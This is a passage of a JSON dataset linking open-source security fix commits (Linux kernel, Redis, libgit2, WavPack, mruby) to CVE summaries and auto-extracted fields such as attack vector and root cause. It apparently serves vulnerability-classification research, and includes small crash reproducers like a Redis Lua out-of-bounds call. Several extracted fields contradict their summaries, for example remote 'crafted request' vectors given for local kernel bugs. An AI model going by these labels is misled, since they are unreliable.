r2_hoobr_r_read_le32 ( over <number> entrypoints ) and read_le oobread ( # <number> )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted elf file","Impact":"cause a denial of service ( heap - based out - of - bounds read and application crash )","Root Cause":"caused by a heap-based out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"041e53cab7ca33481ae45ecd65ad596976d78e68","cve_id":"CVE-2018-11375","cwe_id":"CWE-125","commit_message":"Fix crash in anal.avr","summary":"The _inst__lds() function in radare2 2.5.0 allows remote attackers to cause a denial of service (heap-based out-of-bounds read and application crash) via a crafted binary file.","commit_message_1":"fix crash in <file>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted binary file","Impact":"cause a denial of service ( heap - based out - of - bounds read and application crash )","Root Cause":"caused by a heap-based out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"ee58aff6918b8bbc3be29b9e3089485ea46ff956","cve_id":"CVE-2018-11363","cwe_id":"CWE-125","commit_message":"jpeg: Fix another possible buffer overrun\n\nFound via the clang libfuzzer","summary":"jpeg_size in pdfgen.c in PDFGen before 2018-04-09 has a heap-based buffer over-read.","commit_message_1":"fix another possible buffer overrun found via the clang libfuzzer","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"has a heap-based buffer over-read","Impact":"cause a denial of service","Root Cause":"caused by a heap-based buffer over-read","Attack Type":"remote attacker"},{"commit_id":"f09444639099584bc4784dfcd85ada67c6f33e0f","cve_id":"CVE-2018-11232","cwe_id":"CWE-20","commit_message":"coresight: fix kernel panic caused by invalid CPU\n\nCommit d52c9750f150 (\"coresight: reset \"enable_sink\" flag when need be\")\ncaused a kernel panic because of the using of an invalid value: after\n'for_each_cpu(cpu, mask)', value of local variable 'cpu' become invalid,\ncauses following 'cpu_to_node' access invalid memory area.\n\nThis patch brings the deleted 'cpu = cpumask_first(mask)' back.\n\nPanic log:\n\n $ perf record -e cs_etm\/\/ ls\n\n Unable to handle kernel paging request at virtual address fffe801804af4f10\n pgd = ffff8017ce031600\n [fffe801804af4f10] *pgd=0000000000000000, *pud=0000000000000000\n Internal error: Oops: 96000004 [#1] SMP\n Modules linked in:\n CPU: 33 PID: 1619 Comm: perf Not tainted 4.7.1+ #16\n Hardware name: Huawei Taishan 2280 \/CH05TEVBA, BIOS 1.10 11\/24\/2016\n task: ffff8017cb0c8400 ti: ffff8017cb154000 task.ti: ffff8017cb154000\n PC is at tmc_alloc_etf_buffer+0x60\/0xd4\n LR is at tmc_alloc_etf_buffer+0x44\/0xd4\n pc : [<ffff000008633df8>] lr : [<ffff000008633ddc>] pstate: 60000145\n sp : ffff8017cb157b40\n x29: ffff8017cb157b40 x28: 0000000000000000\n ...skip...\n 7a60: ffff000008c64dc8 0000000000000006 0000000000000253 ffffffffffffffff\n 7a80: 0000000000000000 0000000000000000 ffff0000080872cc 0000000000000001\n [<ffff000008633df8>] tmc_alloc_etf_buffer+0x60\/0xd4\n [<ffff000008632b9c>] etm_setup_aux+0x1dc\/0x1e8\n [<ffff00000816eed4>] rb_alloc_aux+0x2b0\/0x338\n [<ffff00000816a5e4>] perf_mmap+0x414\/0x568\n [<ffff0000081ab694>] mmap_region+0x324\/0x544\n [<ffff0000081abbe8>] do_mmap+0x334\/0x3e0\n [<ffff000008191150>] vm_mmap_pgoff+0xa4\/0xc8\n [<ffff0000081a9a30>] SyS_mmap_pgoff+0xb0\/0x22c\n [<ffff0000080872e4>] sys_mmap+0x18\/0x28\n [<ffff0000080843f0>] el0_svc_naked+0x24\/0x28\n Code: 912040a5 d0001c00 f873d821 911c6000 (b8656822)\n ---[ end trace 98933da8f92b0c9a ]---\n\nSigned-off-by: Wang Nan <wangnan0@huawei.com>\nCc: Xia Kaixu <xiakaixu@huawei.com>\nCc: Li Zefan <lizefan@huawei.com>\nCc: Mathieu Poirier <mathieu.poirier@linaro.org>\nCc: linux-arm-kernel@lists.infradead.org\nCc: linux-kernel@vger.kernel.org\nFixes: d52c9750f150 (\"coresight: reset \"enable_sink\" flag when need be\")\nSigned-off-by: Mathieu Poirier <mathieu.poirier@linaro.org>\nCc: stable <stable@vger.kernel.org> # 4.10\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The etm_setup_aux function in drivers\/hwtracing\/coresight\/coresight-etm-perf.c in the Linux kernel before 4.10.2 allows attackers to cause a denial of service (panic) because a parameter is incorrectly used as a local variable.","commit_message_1":"fix kernel panic caused by invalid cpu commit d52c9750f150 ( `` coresight : reset `` enable_sink '' flag when need be '' ) caused a kernel panic because of the using of an invalid value : after 'for_each_cpu ( cpu , mask ) ' , value of local variable 'cpu ' become invalid , cause following 'cpu_to_node ' access invalid memory area","Vulnerability Type":"Improper Input Validation","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service ( panic ) because a parameter is incorrectly used as a local variable","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"e89086e09a38cc6713bcd4b9c29abf92cf393936","cve_id":"CVE-2018-11219","cwe_id":"CWE-190","commit_message":"Security: fix Lua struct package offset handling.\n\nAfter the first fix to the struct package I found another similar\nproblem, which is fixed by this patch. It could be reproduced easily by\nrunning the following script:\n\n    return struct.unpack('f', \"xxxxxxxxxxxxx\",-3)\n\nThe above will access bytes before the 'data' pointer.","summary":"An Integer Overflow issue was discovered in the struct library in the Lua subsystem in Redis before 3.2.12, 4.x before 4.0.10, and 5.x before 5.0 RC2, leading to a failure of bounds checking.","commit_message_1":"fix lua struct package offset handling","Vulnerability Type":"integer overflow","Attack Vector":"By sending an overly long argument","Impact":"overflow a buffer and execute arbitrary code on the system","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"5ccb6f7a791bf3490357b00a898885759d98bab0","cve_id":"CVE-2018-11218","cwe_id":"CWE-119","commit_message":"Security: more cmsgpack fixes by @soloestoy.\n\n@soloestoy sent me this additional fixes, after searching for similar\nproblems to the one reported in mp_pack(). I'm committing the changes\nbecause it was not possible during to make a public PR to protect Redis\nusers and give Redis providers some time to patch their systems.","summary":"Memory Corruption was discovered in the cmsgpack library in the Lua subsystem in Redis before 3.2.12, 4.x before 4.0.10, and 5.x before 5.0 RC2 because of stack-based buffer overflows.","commit_message_1":"more cmsgpack fix by @ soloestoy","Vulnerability Type":"buffer overflow","Attack Vector":"because of stack-based buffer overflows","Impact":"overflow a buffer and cause the application to crash","Root Cause":"caused by improper bounds checking by the cmsgpack library","Attack Type":"remote attacker"},{"commit_id":"9de4ee40547fd315d4a0ed1dd15a2fa3559ad707","cve_id":"CVE-2018-10940","cwe_id":"CWE-119","commit_message":"cdrom: information leak in cdrom_ioctl_media_changed()\n\nThis cast is wrong.  \"cdi->capacity\" is an int and \"arg\" is an unsigned\nlong.  The way the check is written now, if one of the high 32 bits is\nset then we could read outside the info->slots[] array.\n\nThis bug is pretty old and it predates git.\n\nReviewed-by: Christoph Hellwig <hch@lst.de>\nCc: stable@vger.kernel.org\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nSigned-off-by: Jens Axboe <axboe@kernel.dk>","summary":"The cdrom_ioctl_media_changed function in drivers\/cdrom\/cdrom.c in the Linux kernel before 4.16.6 allows local attackers to use a incorrect bounds check in the CDROM driver CDROM_MEDIA_CHANGED ioctl to read out kernel memory.","commit_message_1":"information leak in cdrom_ioctl_media_changed ( ) this cast is wrong","Vulnerability Type":"buffer overflow","Attack Vector":"By using a specially-crafted ioctl","Impact":"use a incorrect bounds check in the cdrom driver cdrom _ media _ changed ioctl to read out kernel memory .","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"a27e07d90a4608ceaf928b1babb27d4d803e1992","cve_id":"CVE-2018-10916","cwe_id":"CWE-20","commit_message":"mirror: prepend .\/ to rm and chmod arguments to avoid URL recognition (fix #452)","summary":"It has been discovered that lftp up to and including version 4.8.3 does not properly sanitize remote file names, leading to a loss of integrity on the local system when reverse mirroring is used. A remote attacker may trick a user to use reverse mirroring on an attacker controlled FTP server, resulting in the removal of all files in the current working directory of the victim's system.","commit_message_1":"prepend","Vulnerability Type":"Improper Input Validation","Attack Vector":"By persuading a user to use reverse mirroring on an attacker controlled FTP server","Impact":"bypass security restrictions","Root Cause":"does not properly sanitize remote file names , leading to a loss of integrity on the local system when reverse mirroring is used","Attack Type":"remote attacker"},{"commit_id":"9844d38bed10e9ff17174434b3421b227ae710f3","cve_id":"CVE-2018-10888","cwe_id":"CWE-125","commit_message":"delta: fix out-of-bounds read of delta\n\nWhen computing the offset and length of the delta base, we repeatedly\nincrement the `delta` pointer without checking whether we have advanced\npast its end already, which can thus result in an out-of-bounds read.\nFix this by repeatedly checking whether we have reached the end. Add a\ntest which would cause Valgrind to produce an error.\n\nReported-by: Riccardo Schirone <rschiron@redhat.com>\nTest-provided-by: Riccardo Schirone <rschiron@redhat.com>","summary":"A flaw was found in libgit2 before version 0.27.3. A missing check in git_delta_apply function in delta.c file, may lead to an out-of-bound read while reading a binary delta file. An attacker may use this flaw to cause a Denial of Service.","commit_message_1":"fix out-of-bounds read of delta when computing the offset and length of the delta base , we repeatedly increment the ` delta ` pointer without checking whether we have advanced past it end already , which can thus result in an out-of-bounds read","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a missing check","Attack Type":"remote attacker"},{"commit_id":"c1577110467b701dcbcf9439ac225ea851b47d22","cve_id":"CVE-2018-10887","cwe_id":"CWE-125","commit_message":"delta: fix overflow when computing limit\n\nWhen checking whether a delta base offset and length fit into the base\nwe have in memory already, we can trigger an overflow which breaks the\ncheck. This would subsequently result in us reading memory from out of\nbounds of the base.\n\nThe issue is easily fixed by checking for overflow when adding `off` and\n`len`, thus guaranteeting that we are never indexing beyond `base_len`.\nThis corresponds to the git patch 8960844a7 (check patch_delta bounds\nmore carefully, 2006-04-07), which adds these overflow checks.\n\nReported-by: Riccardo Schirone <rschiron@redhat.com>","summary":"A flaw was found in libgit2 before version 0.27.3. It has been discovered that an unexpected sign extension in git_delta_apply function in delta.c file may lead to an integer overflow which in turn leads to an out of bound read, allowing to read before the base object. An attacker may use this flaw to leak memory addresses or cause a Denial of Service.","commit_message_1":"fix overflow when computing limit when checking whether a delta base offset and length fit into the base we have in memory already , we can trigger an overflow which break the check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"975528f632f73fbffa3f1fee304e3bbe3296cffc","cve_id":"CVE-2018-10861","cwe_id":"CWE-287","commit_message":"Merge remote-tracking branch 'private\/wip-mon-snap-caps'","summary":"A flaw was found in the way ceph mon handles user requests. Any authenticated ceph user having read access to ceph can delete, create ceph storage pools and corrupt snapshot images. Ceph branches master, mimic, luminous and jewel are believed to be affected.","commit_message_1":"merge remote-tracking branch 'private\/wip-mon-snap-caps '","Vulnerability Type":"Improper Authentication","Attack Vector":"ceph can delete, create ceph storage pools and corrupt snapshot images","Impact":"bypass security restrictions","Root Cause":"caused by the improper handling of user requests","Attack Type":"attacker"},{"commit_id":"cf429e0a2fe26b5f01ce0c8e9b79432e94509b6e","cve_id":"CVE-2018-10717","cwe_id":"CWE-119","commit_message":"fix \"pixel overrun\"\n\nfixes #3","summary":"The DecodeGifImg function in ngiflib.c in MiniUPnP ngiflib 0.4 does not consider the bounds of the pixels data structure, which allows remote attackers to cause a denial of service (WritePixels heap-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted GIF file, a different vulnerability than CVE-2018-10677.","commit_message_1":"fix `` pixel overrun ''","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted gif file , a different vulnerability than cve - 2018 - 10677","Impact":"cause a denial of service ( writepixels heap - based buffer overflow and application crash ) or possibly have unspecified other impact","Root Cause":"does not consider the bounds of the pixels data structure","Attack Type":"remote attacker"},{"commit_id":"b588a2249c7abbfc52173e32ee11d6facef82f89","cve_id":"CVE-2018-10677","cwe_id":"CWE-119","commit_message":"check GIF image position and dimensions\n\nfixes #1","summary":"The DecodeGifImg function in ngiflib.c in MiniUPnP ngiflib 0.4 lacks certain checks against width and height, which allows remote attackers to cause a denial of service (WritePixels heap-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted GIF file.","commit_message_1":"check gif image position and dimension","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted gif file","Impact":"cause a denial of service ( writepixels heap - based buffer overflow and application crash ) or possibly have unspecified other impact","Root Cause":"caused by a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"73223e4e2e3867ebf033a5a8eb2e5df0158ccc99","cve_id":"CVE-2018-10675","cwe_id":"CWE-416","commit_message":"mm\/mempolicy: fix use after free when calling get_mempolicy\n\nI hit a use after free issue when executing trinity and repoduced it\nwith KASAN enabled.  The related call trace is as follows.\n\n  BUG: KASan: use after free in SyS_get_mempolicy+0x3c8\/0x960 at addr ffff8801f582d766\n  Read of size 2 by task syz-executor1\/798\n\n  INFO: Allocated in mpol_new.part.2+0x74\/0x160 age=3 cpu=1 pid=799\n     __slab_alloc+0x768\/0x970\n     kmem_cache_alloc+0x2e7\/0x450\n     mpol_new.part.2+0x74\/0x160\n     mpol_new+0x66\/0x80\n     SyS_mbind+0x267\/0x9f0\n     system_call_fastpath+0x16\/0x1b\n  INFO: Freed in __mpol_put+0x2b\/0x40 age=4 cpu=1 pid=799\n     __slab_free+0x495\/0x8e0\n     kmem_cache_free+0x2f3\/0x4c0\n     __mpol_put+0x2b\/0x40\n     SyS_mbind+0x383\/0x9f0\n     system_call_fastpath+0x16\/0x1b\n  INFO: Slab 0xffffea0009cb8dc0 objects=23 used=8 fp=0xffff8801f582de40 flags=0x200000000004080\n  INFO: Object 0xffff8801f582d760 @offset=5984 fp=0xffff8801f582d600\n\n  Bytes b4 ffff8801f582d750: ae 01 ff ff 00 00 00 00 5a 5a 5a 5a 5a 5a 5a 5a  ........ZZZZZZZZ\n  Object ffff8801f582d760: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b  kkkkkkkkkkkkkkkk\n  Object ffff8801f582d770: 6b 6b 6b 6b 6b 6b 6b a5                          kkkkkkk.\n  Redzone ffff8801f582d778: bb bb bb bb bb bb bb bb                          ........\n  Padding ffff8801f582d8b8: 5a 5a 5a 5a 5a 5a 5a 5a                          ZZZZZZZZ\n  Memory state around the buggy address:\n  ffff8801f582d600: fb fb fb fc fc fc fc fc fc fc fc fc fc fc fc fc\n  ffff8801f582d680: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n  >ffff8801f582d700: fc fc fc fc fc fc fc fc fc fc fc fc fb fb fb fc\n\n!shared memory policy is not protected against parallel removal by other\nthread which is normally protected by the mmap_sem.  do_get_mempolicy,\nhowever, drops the lock midway while we can still access it later.\n\nEarly premature up_read is a historical artifact from times when\nput_user was called in this path see https:\/\/lwn.net\/Articles\/124754\/\nbut that is gone since 8bccd85ffbaf (\"[PATCH] Implement sys_* do_*\nlayering in the memory policy layer.\").  but when we have the the\ncurrent mempolicy ref count model.  The issue was introduced\naccordingly.\n\nFix the issue by removing the premature release.\n\nLink: http:\/\/lkml.kernel.org\/r\/1502950924-27521-1-git-send-email-zhongjiang@huawei.com\nSigned-off-by: zhong jiang <zhongjiang@huawei.com>\nAcked-by: Michal Hocko <mhocko@suse.com>\nCc: Minchan Kim <minchan@kernel.org>\nCc: Vlastimil Babka <vbabka@suse.cz>\nCc: David Rientjes <rientjes@google.com>\nCc: Mel Gorman <mgorman@techsingularity.net>\nCc: <stable@vger.kernel.org>\t[2.6+]\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The do_get_mempolicy function in mm\/mempolicy.c in the Linux kernel before 4.12.9 allows local users to cause a denial of service (use-after-free) or possibly have unspecified other impact via crafted system calls.","commit_message_1":"fix use after free when calling get_mempolicy i hit a use after free issue when executing trinity and repoduced it with kasan enabled","Vulnerability Type":"Use After Free","Attack Vector":"via crafted system calls","Impact":"cause a denial of service ( use - after - free ) or possibly have unspecified other impact","Root Cause":"caused by a use-after-free","Attack Type":"local attacker"},{"commit_id":"6f8bb34c2993a48ab9afbe353e6d0cff7c8d821d","cve_id":"CVE-2018-10540","cwe_id":"CWE-787","commit_message":"issue #33, sanitize size of unknown chunks before malloc()","summary":"An issue was discovered in WavPack 5.1.0 and earlier for W64 input. Out-of-bounds writes can occur because ParseWave64HeaderConfig in wave64.c does not validate the sizes of unknown chunks before attempting memory allocation, related to a lack of integer-overflow protection within a bytes_to_copy calculation and subsequent malloc call, leading to insufficient memory allocation.","commit_message_1":"issue # <number> , sanitize size of unknown chunk before malloc ( )","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds write flaw","Attack Type":"remote attacker"},{"commit_id":"26cb47f99d481ad9b93eeff80d26e6b63bbd7e15","cve_id":"CVE-2018-10537","cwe_id":"CWE-119","commit_message":"issue #30 issue #31 issue #32: no multiple format chunks in WAV or W64","summary":"An issue was discovered in WavPack 5.1.0 and earlier. The W64 parser component contains a vulnerability that allows writing to memory because ParseWave64HeaderConfig in wave64.c does not reject multiple format chunks.","commit_message_1":"issue # <number> issue # <number> issue # <number> : no multiple format chunk in wav or w64","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a heap-based buffer overwrite issue","Attack Type":"remote attacker"},{"commit_id":"f0c505a3e5d47989a5f69be2d0d4f250af6b1a6c","cve_id":"CVE-2018-10529","cwe_id":"CWE-125","commit_message":"X3F property table list fix","summary":"An issue was discovered in LibRaw 0.18.9. There is an out-of-bounds read affecting the X3F property table list implementation in libraw_x3f.cpp and libraw_cxx.cpp.","commit_message_1":"x3f property table list fix","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"895529fc2f2eb8bc633edd6b04b5b237eb4db564","cve_id":"CVE-2018-10528","cwe_id":"CWE-125","commit_message":"X3F parser possible buffer overrun","summary":"An issue was discovered in LibRaw 0.18.9. There is a stack-based buffer overflow in the utf2char function in libraw_cxx.cpp.","commit_message_1":"x3f parser possible buffer overrun","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a stack-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"a642587a9c9e2dd7feacdf513c3643ce26ad3c22","cve_id":"CVE-2018-10360","cwe_id":"CWE-125","commit_message":"Avoid reading past the end of buffer (Rui Reis)","summary":"The do_core_note function in readelf.c in libmagic.a in file 5.33 allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via a crafted ELF file.","commit_message_1":"avoid reading past the end of buffer ( rui real )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted elf file","Impact":"cause a denial of service ( out - of - bounds read and application crash )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"b51b21fc63c9805862322551387d9036f2b63433","cve_id":"CVE-2018-10199","cwe_id":"CWE-416","commit_message":"Fix `use after free in File#initilialize_copy`; fix #4001\n\nThe bug and the fix were reported by https:\/\/hackerone.com\/pnoltof","summary":"In versions of mruby up to and including 1.4.0, a use-after-free vulnerability exists in src\/io.c::File#initilialize_copy(). An attacker that can cause Ruby code to be run can possibly use this to execute arbitrary code.","commit_message_1":"fix ` use after free in file # initilialize_copy ` ; fix # <number>","Vulnerability Type":"Use After Free","Attack Vector":"By sending a specially-crafted request","Impact":"execute arbitrary code","Root Cause":"caused by a use-after-free","Attack Type":"attacker"},{"commit_id":"1905091634a6a2925c911484434448e568330626","cve_id":"CVE-2018-10191","cwe_id":"CWE-190","commit_message":"Check length of env stack before accessing upvar; fix #3995","summary":"In versions of mruby up to and including 1.4.0, an integer overflow exists in src\/vm.c::mrb_vm_exec() when handling OP_GETUPVAR in the presence of deep scope nesting, resulting in a use-after-free. An attacker that can cause Ruby code to be run can use this to possibly execute arbitrary code.","commit_message_1":"check length of env stack before accessing upvar ; fix # <number>","Vulnerability Type":"integer overflow","Attack Vector":"By sending a specially-crafted request","Impact":"execute arbitrary code","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"4ea77014af0d6205b05503d1c7aac6eace11d473","cve_id":"CVE-2018-10124","cwe_id":"CWE-119","commit_message":"kernel\/signal.c: avoid undefined behaviour in kill_something_info\n\nWhen running kill(72057458746458112, 0) in userspace I hit the following\nissue.\n\n  UBSAN: Undefined behaviour in kernel\/signal.c:1462:11\n  negation of -2147483648 cannot be represented in type 'int':\n  CPU: 226 PID: 9849 Comm: test Tainted: G    B          ---- -------   3.10.0-327.53.58.70.x86_64_ubsan+ #116\n  Hardware name: Huawei Technologies Co., Ltd. RH8100 V3\/BC61PBIA, BIOS BLHSV028 11\/11\/2014\n  Call Trace:\n    dump_stack+0x19\/0x1b\n    ubsan_epilogue+0xd\/0x50\n    __ubsan_handle_negate_overflow+0x109\/0x14e\n    SYSC_kill+0x43e\/0x4d0\n    SyS_kill+0xe\/0x10\n    system_call_fastpath+0x16\/0x1b\n\nAdd code to avoid the UBSAN detection.\n\n[akpm@linux-foundation.org: tweak comment]\nLink: http:\/\/lkml.kernel.org\/r\/1496670008-59084-1-git-send-email-zhongjiang@huawei.com\nSigned-off-by: zhongjiang <zhongjiang@huawei.com>\nCc: Oleg Nesterov <oleg@redhat.com>\nCc: Michal Hocko <mhocko@kernel.org>\nCc: Vlastimil Babka <vbabka@suse.cz>\nCc: Xishi Qiu <qiuxishi@huawei.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The kill_something_info function in kernel\/signal.c in the Linux kernel before 4.13, when an unspecified architecture and compiler is used, might allow local users to cause a denial of service via an INT_MIN argument.","commit_message_1":"avoid undefined behaviour in kill_something_info when running kill ( <number> , <number> ) in userspace i hit the following issue","Vulnerability Type":"buffer overflow","Attack Vector":"via an int _ min argument ","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"dd83c161fbcc5d8be637ab159c0de015cbff5ba4","cve_id":"CVE-2018-10087","cwe_id":"CWE-20","commit_message":"kernel\/exit.c: avoid undefined behaviour when calling wait4()\n\nwait4(-2147483648, 0x20, 0, 0xdd0000) triggers:\nUBSAN: Undefined behaviour in kernel\/exit.c:1651:9\n\nThe related calltrace is as follows:\n\n  negation of -2147483648 cannot be represented in type 'int':\n  CPU: 9 PID: 16482 Comm: zj Tainted: G    B          ---- -------   3.10.0-327.53.58.71.x86_64+ #66\n  Hardware name: Huawei Technologies Co., Ltd. Tecal RH2285          \/BC11BTSA              , BIOS CTSAV036 04\/27\/2011\n  Call Trace:\n    dump_stack+0x19\/0x1b\n    ubsan_epilogue+0xd\/0x50\n    __ubsan_handle_negate_overflow+0x109\/0x14e\n    SyS_wait4+0x1cb\/0x1e0\n    system_call_fastpath+0x16\/0x1b\n\nExclude the overflow to avoid the UBSAN warning.\n\nLink: http:\/\/lkml.kernel.org\/r\/1497264618-20212-1-git-send-email-zhongjiang@huawei.com\nSigned-off-by: zhongjiang <zhongjiang@huawei.com>\nCc: Oleg Nesterov <oleg@redhat.com>\nCc: David Rientjes <rientjes@google.com>\nCc: Aneesh Kumar K.V <aneesh.kumar@linux.vnet.ibm.com>\nCc: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>\nCc: Xishi Qiu <qiuxishi@huawei.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The kernel_wait4 function in kernel\/exit.c in the Linux kernel before 4.13, when an unspecified architecture and compiler is used, might allow local users to cause a denial of service by triggering an attempted use of the -INT_MIN value.","commit_message_1":"avoid undefined behaviour when calling wait4 ( ) wait4 ( -<number> , 0x20 , <number> , 0xdd0000 ) trigger : ubsan : undefined behaviour in kernel\/<file> : <number> : <number> the related calltrace is a follows : negation of -<number> can not be represented in type 'int ' : cpu : <number> pid : <number> comm : zj tainted : g b -- -- -- -- -- - <file>","Vulnerability Type":"Improper Input Validation","Attack Vector":"by triggering an attempted use of the - int _ min value","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"9903e41ae1f5d50c93f268ca3304d4d7c64b9311","cve_id":"CVE-2018-10074","cwe_id":"CWE-476","commit_message":"clk: hisilicon: hi3660\uff1aFix potential NULL dereference in hi3660_stub_clk_probe()\n\nplatform_get_resource() may return NULL, add proper check to\navoid potential NULL dereferencing.\n\nThis is detected by Coccinelle semantic patch.\n\n@@\nexpression pdev, res, n, t, e, e1, e2;\n@@\n\nres = platform_get_resource(pdev, t, n);\n+ if (!res)\n+   return -EINVAL;\n... when != res == NULL\ne = devm_ioremap(e1, res->start, e2);\n\nFixes: 4f16f7ff3bc0 (\"clk: hisilicon: Add support for Hi3660 stub clocks\")\nSigned-off-by: Wei Yongjun <weiyongjun1@huawei.com>\nSigned-off-by: Stephen Boyd <sboyd@kernel.org>","summary":"The hi3660_stub_clk_probe function in drivers\/clk\/hisilicon\/clk-hi3660-stub.c in the Linux kernel before 4.16 allows local users to cause a denial of service (NULL pointer dereference) by triggering a failure of resource retrieval.","commit_message_1":"hisilicon : hi3660\uff1afix potential null dereference in hi3660_stub_clk_probe ( ) platform_get_resource ( ) may return null , add proper check to avoid potential null dereferencing","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by triggering a failure of resource retrieval","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"318aaf34f1179b39fa9c30fa0f3288b645beee39","cve_id":"CVE-2018-10021","cwe_id":null,"commit_message":"scsi: libsas: defer ata device eh commands to libata\n\nWhen ata device doing EH, some commands still attached with tasks are\nnot passed to libata when abort failed or recover failed, so libata did\nnot handle these commands. After these commands done, sas task is freed,\nbut ata qc is not freed. This will cause ata qc leak and trigger a\nwarning like below:\n\nWARNING: CPU: 0 PID: 28512 at drivers\/ata\/libata-eh.c:4037\nata_eh_finish+0xb4\/0xcc\nCPU: 0 PID: 28512 Comm: kworker\/u32:2 Tainted: G     W  OE 4.14.0#1\n......\nCall trace:\n[<ffff0000088b7bd0>] ata_eh_finish+0xb4\/0xcc\n[<ffff0000088b8420>] ata_do_eh+0xc4\/0xd8\n[<ffff0000088b8478>] ata_std_error_handler+0x44\/0x8c\n[<ffff0000088b8068>] ata_scsi_port_error_handler+0x480\/0x694\n[<ffff000008875fc4>] async_sas_ata_eh+0x4c\/0x80\n[<ffff0000080f6be8>] async_run_entry_fn+0x4c\/0x170\n[<ffff0000080ebd70>] process_one_work+0x144\/0x390\n[<ffff0000080ec100>] worker_thread+0x144\/0x418\n[<ffff0000080f2c98>] kthread+0x10c\/0x138\n[<ffff0000080855dc>] ret_from_fork+0x10\/0x18\n\nIf ata qc leaked too many, ata tag allocation will fail and io blocked\nfor ever.\n\nAs suggested by Dan Williams, defer ata device commands to libata and\nmerge sas_eh_finish_cmd() with sas_eh_defer_cmd(). libata will handle\nata qcs correctly after this.\n\nSigned-off-by: Jason Yan <yanaijie@huawei.com>\nCC: Xiaofei Tan <tanxiaofei@huawei.com>\nCC: John Garry <john.garry@huawei.com>\nCC: Dan Williams <dan.j.williams@intel.com>\nReviewed-by: Dan Williams <dan.j.williams@intel.com>\nSigned-off-by: Martin K. Petersen <martin.petersen@oracle.com>","summary":"** DISPUTED ** drivers\/scsi\/libsas\/sas_scsi_host.c in the Linux kernel before 4.16 allows local users to cause a denial of service (ata qc leak) by triggering certain failure conditions. NOTE: a third party disputes the relevance of this report because the failure can only occur for physically proximate attackers who unplug SAS Host Bus Adapter cables.","commit_message_1":"libsas : defer ata device eh command to libata when ata device doing eh , some command still attached with task are not passed to libata when abort failed or recover failed , so libata did not handle these command","Vulnerability Type":"ata qc leak","Attack Vector":"by triggering certain failure conditions","Impact":"cause a denial of service ( ata qc leak )","Root Cause":"caused by ata qc leak","Attack Type":"local attacker"},{"commit_id":"492022c7297ede682161d9c0ec2de15526424e76","cve_id":"CVE-2018-10017","cwe_id":"CWE-125","commit_message":"[Fix] Possible out-of-bounds read when computing length of some IT files with pattern loops (OpenMPT: formats that are converted to IT, libopenmpt: IT\/ITP\/MO3), caught with afl-fuzz.\n\ngit-svn-id: https:\/\/source.openmpt.org\/svn\/openmpt\/trunk\/OpenMPT@10027 56274372-70c3-4bfc-bfc3-4c3a0b034d27","summary":"soundlib\/Snd_fx.cpp in OpenMPT before 1.27.07.00 and libopenmpt before 0.3.8 allows remote attackers to cause a denial of service (out-of-bounds read) via an IT or MO3 file with many nested pattern loops.","commit_message_1":"possible out-of-bounds read when computing length of some it file with pattern loop ( openmpt : format that are converted to it , libopenmpt : it\/itp\/mo3 ) , caught with afl-fuzz","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via an it or mo3 file with many nested pattern loops","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"740b218386083dc708ce98ccc94a63a95cd5629e","cve_id":"CVE-2018-9989","cwe_id":"CWE-125","commit_message":"Add bounds check before length read","summary":"ARM mbed TLS before 2.1.11, before 2.7.2, and before 2.8.0 has a buffer over-read in ssl_parse_server_psk_hint() that could cause a crash on invalid input.","commit_message_1":"add bound check before length 